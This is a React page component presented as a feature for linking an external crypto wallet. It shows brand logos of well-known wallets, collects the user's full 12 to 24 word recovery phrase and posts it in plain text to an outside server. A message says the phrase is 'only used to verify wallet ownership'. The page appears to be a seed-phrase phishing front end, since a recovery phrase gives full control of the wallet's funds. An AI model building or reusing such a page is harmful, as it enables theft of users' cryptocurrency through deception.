// pages/LinkWallet.jsx
import React, { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import {
  ArrowLeftIcon,
  LinkIcon,
  CheckCircleIcon,
  XCircleIcon,
  ChevronDownIcon,
  ShieldCheckIcon,
} from "@heroicons/react/24/outline";
import trustWalletLogo from "../assets/trustwallet.png";
import metaMaskLogo from "../assets/metamask.png";
import ledgerLogo from "../assets/ledger.png";
import trezorLogo from "../assets/trezor.png";
import phantomLogo from "../assets/phantom.png";
import exodusLogo from "../assets/exodus.png";
import coinbaseLogo from "../assets/coinbase.png";

const walletOptions = [
  "Trust Wallet",
  "MetaMask",
  "Ledger",
  "Trezor",
  "Phantom",
  "Exodus",
  "Coinbase Wallet",
  "Other",
];

const walletMeta = {
  "Trust Wallet": {
    color: "#3375BB",
    logo: trustWalletLogo,
  },
  MetaMask: {
    color: "#F6851B",
    logo: metaMaskLogo,
  },
  Ledger: {
    color: "#C9A84C",
    logo: ledgerLogo,
  },
  Trezor: {
    color: "#00854D",
    logo: trezorLogo,
  },
  Phantom: {
    color: "#AB9FF2",
    logo: phantomLogo,
  },
  Exodus: {
    color: "#8B5CF6",
    logo: exodusLogo,
  },
  "Coinbase Wallet": {
    color: "#0052FF",
    logo: coinbaseLogo,
  },
  Other: {
    color: "#C9A84C",
    logo: "",
  },
};

const getWalletMeta = (wallet) => walletMeta[wallet] || walletMeta.Other;

const WalletLogo = ({ wallet, size = 32 }) => {
  const [failed, setFailed] = useState(false);
  const meta = getWalletMeta(wallet);

  if (!meta.logo || failed) {
    return (
      <span
        style={{
          width: size,
          height: size,
          borderRadius: "50%",
          display: "inline-flex",
          alignItems: "center",
          justifyContent: "center",
          background: `${meta.color}18`,
          border: `1px solid ${meta.color}35`,
          color: meta.color,
          fontSize: Math.max(11, size * 0.38),
          fontWeight: 800,
          flexShrink: 0,
        }}
      >
        {(wallet || "W").charAt(0)}
      </span>
    );
  }

  return (
    <span
      style={{
        width: size,
        height: size,
        borderRadius: "50%",
        display: "inline-flex",
        alignItems: "center",
        justifyContent: "center",
        background: `${meta.color}12`,
        border: `1px solid ${meta.color}30`,
        flexShrink: 0,
      }}
    >
      <img
        src={meta.logo}
        alt={`${wallet} logo`}
        onError={() => setFailed(true)}
        style={{
          width: Math.round(size * 0.58),
          height: Math.round(size * 0.58),
          objectFit: "contain",
          display: "block",
        }}
      />
    </span>
  );
};

const baseInput = {
  width: "100%",
  background: "#04090F",
  border: "1px solid rgba(201,168,76,0.15)",
  borderRadius: 12,
  color: "white",
  fontSize: 14,
  outline: "none",
  transition: "border-color 0.2s",
  padding: "0.75rem 1rem",
};
const focusStyle = { borderColor: "rgba(201,168,76,0.5)" };

const LinkWallet = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    walletName: "Trust Wallet",
    phrase: "",
  });
  const [customWalletName, setCustomWalletName] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");
  const [linkedWallet, setLinkedWallet] = useState(null);
  const [focused, setFocused] = useState({});
  const [wordCount, setWordCount] = useState(0);

  const formatDate = (d) => {
    if (!d) return "N/A";
    try {
      return new Date(d).toLocaleString("en-US", {
        year: "numeric",
        month: "short",
        day: "numeric",
        hour: "2-digit",
        minute: "2-digit",
      });
    } catch {
      return "Invalid date";
    }
  };

  const validatePhrase = (phrase) => {
    const words = phrase.trim().split(/\s+/);
    if (words.length < 12) return "Recovery phrase must be at least 12 words";
    if (words.length > 24) return "Recovery phrase cannot exceed 24 words";
    const invalid = words.filter((w) => !/^[a-z]+$/i.test(w));
    if (invalid.length > 0)
      return "Recovery phrase should contain only letters";
    return "";
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((p) => ({ ...p, [name]: value }));
    if (name === "phrase")
      setWordCount(value.trim() ? value.trim().split(/\s+/).length : 0);
    setError("");
  };

  const handleWalletChange = (e) => {
    setFormData((p) => ({ ...p, walletName: e.target.value }));
    setError("");
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!formData.walletName.trim()) {
      setError("Please select a wallet type");
      return;
    }
    const phraseErr = validatePhrase(formData.phrase);
    if (phraseErr) {
      setError(phraseErr);
      return;
    }
    const nameToSend =
      formData.walletName === "Other"
        ? customWalletName.trim()
        : formData.walletName;
    if (!nameToSend) {
      setError("Please enter a wallet name");
      return;
    }

    setLoading(true);
    setError("");
    try {
      const token = localStorage.getItem("token");
      if (!token) {
        navigate("/login");
        return;
      }
      const res = await fetch("https://sukwi-be.onrender.com/api/wallet/link", {
        method: "POST",
        headers: {
          Authorization: `Bearer ${token}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletName: nameToSend,
          phrase: formData.phrase.trim(),
        }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setLinkedWallet(data.data.linkedWallet);
        setSuccess(true);
        setFormData({ walletName: "Trust Wallet", phrase: "" });
        setCustomWalletName("");
        setWordCount(0);
      } else {
        setError(data.message || "Failed to link wallet. Please try again.");
      }
    } catch {
      setError("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const selectedWalletMeta = getWalletMeta(formData.walletName);
  const selectedColor = selectedWalletMeta.color;
  const wordProgress = Math.min((wordCount / 12) * 100, 100);
  const wordValid = wordCount >= 12 && wordCount <= 24;

  return (
    <div style={{ maxWidth: 520, margin: "0 auto", paddingBottom: 80 }}>
      {/* ── Header ── */}
      <div
        style={{
          display: "flex",
          alignItems: "center",
          gap: 14,
          marginBottom: 28,
        }}
      >
        <Link to="/dashboard" style={{ textDecoration: "none" }}>
          <div
            style={{
              width: 40,
              height: 40,
              borderRadius: "50%",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              background: "rgba(201,168,76,0.08)",
              border: "1px solid rgba(201,168,76,0.2)",
              transition: "all 0.2s",
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.background = "rgba(201,168,76,0.15)";
              e.currentTarget.style.borderColor = "rgba(201,168,76,0.4)";
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.background = "rgba(201,168,76,0.08)";
              e.currentTarget.style.borderColor = "rgba(201,168,76,0.2)";
            }}
          >
            <ArrowLeftIcon
              style={{ width: 18, height: 18, color: "#C9A84C" }}
            />
          </div>
        </Link>
        <div>
          <h1
            style={{
              fontSize: 22,
              fontWeight: 800,
              color: "black",
              margin: 0,
              letterSpacing: "-0.02em",
            }}
          >
            Link External Wallet
          </h1>
          <p style={{ fontSize: 12, color: "#3D5A70", margin: "3px 0 0" }}>
            Connect your existing cryptocurrency wallet
          </p>
        </div>
      </div>

      {/* ── Main card ── */}
      <div
        style={{
          borderRadius: 20,
          overflow: "hidden",
          marginBottom: 20,
          background: "linear-gradient(160deg,#0C1C36 0%,#070F1C 100%)",
          border: "1px solid rgba(201,168,76,0.18)",
          boxShadow: "0 0 50px rgba(201,168,76,0.06)",
        }}
      >
        <div
          style={{
            height: 1,
            background:
              "linear-gradient(90deg,transparent,#C9A84C,transparent)",
          }}
        />

        {/* Card header */}
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            padding: "1.25rem 1.5rem",
            borderBottom: "1px solid rgba(201,168,76,0.08)",
          }}
        >
          <div>
            <p
              style={{
                fontSize: 15,
                fontWeight: 700,
                color: "white",
                margin: 0,
              }}
            >
              Link Your Wallet
            </p>
            <p style={{ fontSize: 12, color: "#3D5A70", margin: "3px 0 0" }}>
              Connect an external wallet to your account
            </p>
          </div>
          <div
            style={{
              width: 38,
              height: 38,
              borderRadius: 10,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              background: "rgba(201,168,76,0.08)",
              border: "1px solid rgba(201,168,76,0.2)",
            }}
          >
            <LinkIcon style={{ width: 18, height: 18, color: "#C9A84C" }} />
          </div>
        </div>

        <div style={{ padding: "1.5rem" }}>
          {success && linkedWallet ? (
            /* ── Success state ── */
            <div style={{ display: "flex", flexDirection: "column", gap: 20 }}>
              <div style={{ textAlign: "center" }}>
                <div
                  style={{
                    width: 60,
                    height: 60,
                    borderRadius: "50%",
                    margin: "0 auto 14px",
                    background: "rgba(74,222,128,0.08)",
                    border: "1px solid rgba(74,222,128,0.25)",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  <CheckCircleIcon
                    style={{ width: 28, height: 28, color: "#4ADE80" }}
                  />
                </div>
                <h3
                  style={{
                    fontSize: 16,
                    fontWeight: 800,
                    color: "white",
                    margin: "0 0 6px",
                  }}
                >
                  Wallet Linked Successfully!
                </h3>
                <p style={{ fontSize: 13, color: "#3D5A70", margin: 0 }}>
                  Your wallet has been connected to your account.
                </p>
              </div>

              {/* Wallet details */}
              <div
                style={{
                  padding: 16,
                  borderRadius: 14,
                  background: "rgba(201,168,76,0.03)",
                  border: "1px solid rgba(201,168,76,0.1)",
                }}
              >
                <p
                  style={{
                    fontSize: 12,
                    fontWeight: 600,
                    color: "#4A6E8A",
                    textTransform: "uppercase",
                    letterSpacing: "0.1em",
                    margin: "0 0 12px",
                  }}
                >
                  Linked Wallet Details
                </p>
                <div
                  style={{ display: "flex", flexDirection: "column", gap: 10 }}
                >
                  {[
                    ["Wallet Name", linkedWallet.walletName],
                    ["Linked On", formatDate(linkedWallet.linkedAt)],
                    ["Last Accessed", formatDate(linkedWallet.lastAccessed)],
                    ["Wallet ID", linkedWallet.id?.slice(-8)],
                  ].map(([label, val]) => (
                    <div
                      key={label}
                      style={{
                        display: "flex",
                        justifyContent: "space-between",
                        alignItems: "center",
                      }}
                    >
                      <span style={{ fontSize: 13, color: "#3D5A70" }}>
                        {label}
                      </span>
                      <span
                        style={{
                          fontSize: 13,
                          fontWeight: 600,
                          color: "white",
                          fontFamily:
                            label === "Wallet ID" ? "monospace" : "inherit",
                        }}
                      >
                        {val}
                      </span>
                    </div>
                  ))}
                  <div
                    style={{
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                    }}
                  >
                    <span style={{ fontSize: 13, color: "#3D5A70" }}>
                      Status
                    </span>
                    <span
                      style={{
                        fontSize: 11,
                        fontWeight: 700,
                        padding: "3px 10px",
                        borderRadius: 999,
                        background: linkedWallet.isActive
                          ? "rgba(74,222,128,0.08)"
                          : "rgba(239,68,68,0.08)",
                        border: `1px solid ${linkedWallet.isActive ? "rgba(74,222,128,0.25)" : "rgba(239,68,68,0.25)"}`,
                        color: linkedWallet.isActive ? "#4ADE80" : "#EF4444",
                      }}
                    >
                      {linkedWallet.isActive ? "Active" : "Inactive"}
                    </span>
                  </div>
                </div>
              </div>

              {/* What's next */}
              <div
                style={{
                  padding: 16,
                  borderRadius: 14,
                  background: "rgba(201,168,76,0.03)",
                  border: "1px solid rgba(201,168,76,0.08)",
                }}
              >
                <p
                  style={{
                    fontSize: 12,
                    fontWeight: 600,
                    color: "#4A6E8A",
                    textTransform: "uppercase",
                    letterSpacing: "0.1em",
                    margin: "0 0 10px",
                  }}
                >
                  What's Next?
                </p>
                {[
                  "Your linked wallet will appear in your dashboard.",
                  "You can now receive funds directly to this wallet.",
                  "Manage linked wallets from your account settings.",
                ].map((item, i) => (
                  <div
                    key={i}
                    style={{ display: "flex", gap: 8, marginBottom: 8 }}
                  >
                    <span
                      style={{
                        width: 5,
                        height: 5,
                        borderRadius: "50%",
                        background: "#C9A84C",
                        flexShrink: 0,
                        marginTop: 6,
                      }}
                    />
                    <span
                      style={{
                        fontSize: 12,
                        color: "#3D5A70",
                        lineHeight: 1.5,
                      }}
                    >
                      {item}
                    </span>
                  </div>
                ))}
              </div>

              {/* Actions */}
              <div
                style={{
                  display: "grid",
                  gridTemplateColumns: "1fr 1fr",
                  gap: 10,
                }}
              >
                <button
                  onClick={() => setSuccess(false)}
                  style={{
                    padding: "12px",
                    borderRadius: 12,
                    border: "1px solid rgba(201,168,76,0.25)",
                    background: "rgba(201,168,76,0.06)",
                    color: "#C9A84C",
                    fontSize: 13,
                    fontWeight: 700,
                    cursor: "pointer",
                    transition: "all 0.2s",
                  }}
                  onMouseEnter={(e) => {
                    e.currentTarget.style.background = "rgba(201,168,76,0.12)";
                    e.currentTarget.style.borderColor = "rgba(201,168,76,0.45)";
                  }}
                  onMouseLeave={(e) => {
                    e.currentTarget.style.background = "rgba(201,168,76,0.06)";
                    e.currentTarget.style.borderColor = "rgba(201,168,76,0.25)";
                  }}
                >
                  Link Another
                </button>
                <Link to="/dashboard" style={{ textDecoration: "none" }}>
                  <button
                    style={{
                      width: "100%",
                      padding: "12px",
                      borderRadius: 12,
                      border: "none",
                      background: "linear-gradient(135deg,#C9A84C,#F0C040)",
                      color: "#07111F",
                      fontSize: 13,
                      fontWeight: 700,
                      cursor: "pointer",
                      transition: "box-shadow 0.2s",
                    }}
                    onMouseEnter={(e) =>
                      (e.currentTarget.style.boxShadow =
                        "0 0 20px rgba(201,168,76,0.4)")
                    }
                    onMouseLeave={(e) =>
                      (e.currentTarget.style.boxShadow = "none")
                    }
                  >
                    Back to Dashboard
                  </button>
                </Link>
              </div>
            </div>
          ) : (
            /* ── Form ── */
            <form
              onSubmit={handleSubmit}
              style={{ display: "flex", flexDirection: "column", gap: 18 }}
            >
              {/* Wallet type select */}
              <div>
                <label
                  style={{
                    display: "block",
                    fontSize: 12,
                    fontWeight: 600,
                    color: "#4A6E8A",
                    textTransform: "uppercase",
                    letterSpacing: "0.1em",
                    marginBottom: 8,
                  }}
                >
                  Select Wallet Type
                </label>
                <div style={{ position: "relative" }}>
                  <select
                    value={formData.walletName}
                    onChange={handleWalletChange}
                    onFocus={() => setFocused((p) => ({ ...p, wallet: true }))}
                    onBlur={() => setFocused((p) => ({ ...p, wallet: false }))}
                    style={{
                      ...baseInput,
                      appearance: "none",
                      paddingRight: 36,
                      ...(focused.wallet ? focusStyle : {}),
                    }}
                  >
                    {walletOptions.map((w) => (
                      <option
                        key={w}
                        value={w}
                        style={{ background: "#07111F" }}
                      >
                        {w}
                      </option>
                    ))}
                  </select>
                  <ChevronDownIcon
                    style={{
                      position: "absolute",
                      right: 12,
                      top: "50%",
                      transform: "translateY(-50%)",
                      width: 15,
                      height: 15,
                      color: "#3D5A70",
                      pointerEvents: "none",
                    }}
                  />
                </div>

                {/* Selected wallet preview */}
                {formData.walletName !== "Other" && (
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: 12,
                      marginTop: 10,
                      padding: "12px 14px",
                      borderRadius: 14,
                      background: `${selectedColor}12`,
                      border: `1px solid ${selectedColor}30`,
                    }}
                  >
                    <WalletLogo wallet={formData.walletName} size={44} />
                    <div>
                      <p
                        style={{
                          fontSize: 11,
                          color: "#4A6E8A",
                          fontWeight: 700,
                          letterSpacing: "0.08em",
                          margin: "0 0 3px",
                          textTransform: "uppercase",
                        }}
                      >
                        Selected Wallet
                      </p>
                      <p
                        style={{
                          fontSize: 14,
                          color: "white",
                          fontWeight: 700,
                          margin: 0,
                        }}
                      >
                        {formData.walletName}
                      </p>
                    </div>
                  </div>
                )}
              </div>

              {/* Custom wallet name */}
              {formData.walletName === "Other" && (
                <div>
                  <label
                    style={{
                      display: "block",
                      fontSize: 12,
                      fontWeight: 600,
                      color: "#4A6E8A",
                      textTransform: "uppercase",
                      letterSpacing: "0.1em",
                      marginBottom: 8,
                    }}
                  >
                    Wallet Name
                  </label>
                  <input
                    type="text"
                    value={customWalletName}
                    onChange={(e) => {
                      setCustomWalletName(e.target.value);
                      setError("");
                    }}
                    onFocus={() => setFocused((p) => ({ ...p, custom: true }))}
                    onBlur={() => setFocused((p) => ({ ...p, custom: false }))}
                    placeholder="e.g., My Hardware Wallet"
                    style={{
                      ...baseInput,
                      ...(focused.custom ? focusStyle : {}),
                    }}
                  />
                </div>
              )}

              {/* Recovery phrase */}
              <div>
                <div
                  style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    marginBottom: 8,
                  }}
                >
                  <label
                    style={{
                      fontSize: 12,
                      fontWeight: 600,
                      color: "#4A6E8A",
                      textTransform: "uppercase",
                      letterSpacing: "0.1em",
                    }}
                  >
                    Recovery Phrase
                  </label>
                  <span
                    style={{
                      fontSize: 11,
                      fontWeight: 700,
                      color: wordValid
                        ? "#4ADE80"
                        : wordCount > 0
                          ? "#F59E0B"
                          : "#2E4A60",
                    }}
                  >
                    {wordCount} / 12–24 words
                  </span>
                </div>

                <textarea
                  name="phrase"
                  value={formData.phrase}
                  onChange={handleChange}
                  onFocus={() => setFocused((p) => ({ ...p, phrase: true }))}
                  onBlur={() => setFocused((p) => ({ ...p, phrase: false }))}
                  placeholder="Enter your 12 to 24 word recovery phrase separated by spaces…"
                  rows={4}
                  style={{
                    ...baseInput,
                    resize: "none",
                    lineHeight: 1.7,
                    ...(focused.phrase ? focusStyle : {}),
                  }}
                />

                {/* Word count progress bar */}
                <div
                  style={{
                    marginTop: 8,
                    height: 3,
                    borderRadius: 2,
                    background: "rgba(201,168,76,0.1)",
                    overflow: "hidden",
                  }}
                >
                  <div
                    style={{
                      width: `${wordProgress}%`,
                      height: "100%",
                      borderRadius: 2,
                      background: wordValid ? "#4ADE80" : "#C9A84C",
                      transition: "width 0.3s, background 0.3s",
                    }}
                  />
                </div>
                <p
                  style={{ fontSize: 11, color: "#2E4A60", margin: "5px 0 0" }}
                >
                  Enter words separated by spaces. 12–24 words required.
                </p>
              </div>

              {/* Error */}
              {error && (
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: 8,
                    padding: "10px 14px",
                    borderRadius: 10,
                    background: "rgba(239,68,68,0.06)",
                    border: "1px solid rgba(239,68,68,0.2)",
                  }}
                >
                  <XCircleIcon
                    style={{
                      width: 15,
                      height: 15,
                      color: "#EF4444",
                      flexShrink: 0,
                    }}
                  />
                  <span style={{ fontSize: 13, color: "#EF4444" }}>
                    {error}
                  </span>
                </div>
              )}

              {/* Submit */}
              <button
                type="submit"
                disabled={loading}
                style={{
                  padding: "14px",
                  borderRadius: 12,
                  border: "none",
                  fontSize: 14,
                  fontWeight: 700,
                  cursor: loading ? "not-allowed" : "pointer",
                  background: loading
                    ? "rgba(201,168,76,0.1)"
                    : "linear-gradient(135deg,#C9A84C,#F0C040)",
                  color: loading ? "rgba(201,168,76,0.3)" : "#07111F",
                  transition: "all 0.3s",
                }}
                onMouseEnter={(e) => {
                  if (!loading)
                    e.currentTarget.style.boxShadow =
                      "0 0 26px rgba(201,168,76,0.4)";
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.boxShadow = "none";
                }}
              >
                {loading ? (
                  <span
                    style={{
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      gap: 10,
                    }}
                  >
                    <span
                      style={{
                        width: 15,
                        height: 15,
                        border: "2px solid rgba(201,168,76,0.3)",
                        borderTopColor: "#C9A84C",
                        borderRadius: "50%",
                        animation: "spin 0.8s linear infinite",
                        display: "inline-block",
                      }}
                    />
                    Linking Wallet…
                  </span>
                ) : (
                  "Link Wallet"
                )}
              </button>

              {/* Security note */}
              <div
                style={{ display: "flex", alignItems: "flex-start", gap: 8 }}
              >
                <ShieldCheckIcon
                  style={{
                    width: 14,
                    height: 14,
                    color: "#2E4A60",
                    flexShrink: 0,
                    marginTop: 1,
                  }}
                />
                <p
                  style={{
                    fontSize: 11,
                    color: "#2E4A60",
                    margin: 0,
                    lineHeight: 1.6,
                  }}
                >
                  Your recovery phrase is encrypted and stored securely. It is
                  only used to verify wallet ownership.
                </p>
              </div>
            </form>
          )}
        </div>
      </div>

      {/* ── Supported wallets panel ── */}
      <div
        style={{
          borderRadius: 16,
          overflow: "hidden",
          background: "linear-gradient(160deg,#0C1C36,#070F1C)",
          border: "1px solid rgba(201,168,76,0.1)",
        }}
      >
        <div
          style={{
            height: 1,
            background:
              "linear-gradient(90deg,transparent,rgba(201,168,76,0.3),transparent)",
          }}
        />
        <div
          style={{
            padding: "1rem 1.25rem",
            borderBottom: "1px solid rgba(201,168,76,0.07)",
          }}
        >
          <p
            style={{ fontSize: 13, fontWeight: 700, color: "white", margin: 0 }}
          >
            Supported Wallets
          </p>
        </div>
        <div style={{ padding: "1rem 1.25rem" }}>
          <div
            style={{
              display: "grid",
              gridTemplateColumns: "1fr 1fr",
              gap: 8,
              marginBottom: 12,
            }}
          >
            {walletOptions
              .filter((w) => w !== "Other")
              .map((wallet) => {
                const { color } = getWalletMeta(wallet);
                return (
                  <div
                    key={wallet}
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: 10,
                      padding: "9px 12px",
                      borderRadius: 10,
                      background: `${color}08`,
                      border: `1px solid ${color}1A`,
                      transition: "all 0.2s",
                      cursor: "default",
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = `${color}12`;
                      e.currentTarget.style.borderColor = `${color}35`;
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = `${color}08`;
                      e.currentTarget.style.borderColor = `${color}1A`;
                    }}
                  >
                    <WalletLogo wallet={wallet} size={26} />
                    <span
                      style={{
                        fontSize: 12,
                        fontWeight: 600,
                        color: "#8EB1CE",
                      }}
                    >
                      {wallet}
                    </span>
                  </div>
                );
              })}
          </div>
          <p
            style={{
              fontSize: 11,
              color: "#2E4A60",
              margin: 0,
              lineHeight: 1.5,
            }}
          >
            Most popular cryptocurrency wallets are supported. Contact support
            if your wallet is not listed.
          </p>
        </div>
      </div>

      <style>{`@keyframes spin { to { transform:rotate(360deg); } }`}</style>
    </div>
  );
};

export default LinkWallet;
